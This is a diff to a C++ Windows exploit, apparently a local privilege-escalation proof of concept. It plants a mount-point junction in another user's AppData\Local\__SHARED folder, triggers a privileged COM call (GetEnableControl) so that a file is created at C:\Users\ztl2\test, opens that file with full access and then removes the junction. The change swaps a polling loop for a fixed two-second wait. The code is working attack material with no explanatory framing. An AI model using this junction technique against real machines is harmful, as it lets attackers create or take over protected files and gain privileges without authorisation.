@@ -17,7 +17,7 @@
 
 #pragma warning(disable:4996);
 
-using namespace std; 
+using namespace std;
 
 typedef struct _REPARSE_DATA_BUFFER {
     ULONG  ReparseTag;
@@ -196,7 +196,7 @@ int main(int argc, char* argv[]) {
                 REPARSE_GUID_DATA_BUFFER reparse_buffer = { 0 };
 
                 REPARSE_DATA_BUFFER* buffer = (REPARSE_DATA_BUFFER*)malloc(0x2c);
-         
+
                 WCHAR* filepath = (WCHAR*)L"C:\\Users\\ztl2\\AppData\\Local\\__SHARED";
 
                 //Empty the files under C:\Users\another login username\AppData\Local\__SHARED and set it as the mount point 
@@ -230,50 +230,46 @@ int main(int argc, char* argv[]) {
 
                 p->GetEnableControl(&test);
 
-                while (true)
+                Sleep(2000);
+                
+                WCHAR* file = (WCHAR*)L"C:\\Users\\ztl2\\test";
+
+                HANDLE hFile = CreateFileW(file,
+                    GENERIC_ALL,
+                    0,
+                    NULL,
+                    OPEN_EXISTING,
+                    FILE_FLAG_BACKUP_SEMANTICS,
+                    NULL);
+
+                //Once the file is created we can open the file and finally we cancel the mount point we created 
+
+                if (hFile != INVALID_HANDLE_VALUE)
                 {
-                    WCHAR* file = (WCHAR*)L"C:\\Users\\ztl2\\test";
+                    printf("%S open ok \n", file);
 
-                    HANDLE hFile = CreateFileW(file,
-                        GENERIC_ALL,
-                        0,                               
-                        NULL,
-                        OPEN_EXISTING,                      
-                        FILE_FLAG_BACKUP_SEMANTICS,        
-                        NULL);
+                    const size_t target_byte_size = 0x18;
+                    const size_t printname_byte_size = 0;
+                    const size_t path_buffer_size = 0x24;
 
-                    //Once the file is created we can open the file and finally we cancel the mount point we created 
+                    REPARSE_GUID_DATA_BUFFER reparse_buffer = { 0 };
 
-                    if (hFile != INVALID_HANDLE_VALUE)
-                    {
-                        printf("%S open ok \n", file);
+                    REPARSE_DATA_BUFFER* buffer = (REPARSE_DATA_BUFFER*)malloc(0x2c);
 
-                        const size_t target_byte_size = 0x18;
-                        const size_t printname_byte_size = 0;
-                        const size_t path_buffer_size = 0x24;
+                    HANDLE h = CreateFileW(filepath,
+                        GENERIC_READ | (1 ? GENERIC_WRITE : 0),
+                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                        0,
+                        OPEN_EXISTING,
+                        FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
+                        0);
 
-                        REPARSE_GUID_DATA_BUFFER reparse_buffer = { 0 };
+                    reparse_buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
 
-                        REPARSE_DATA_BUFFER* buffer = (REPARSE_DATA_BUFFER*)malloc(0x2c);
+                    DeviceIoControl(h, FSCTL_DELETE_REPARSE_POINT, &reparse_buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, 0, 0, &dw, 0);
 
-                        HANDLE h = CreateFileW(filepath,
-                            GENERIC_READ | (1 ? GENERIC_WRITE : 0),
-                            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
-                            0,
-                            OPEN_EXISTING,
-                            FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,
-                            0);
-
-                        reparse_buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
-
-                        DeviceIoControl(h, FSCTL_DELETE_REPARSE_POINT, &reparse_buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, 0, 0, &dw, 0);
-
-                        CloseHandle(h);
-                        CloseHandle(hFile);
-
-                        break;
-                    }
-                    Sleep(1);
+                    CloseHandle(h);
+                    CloseHandle(hFile);
                 }
             }
         }
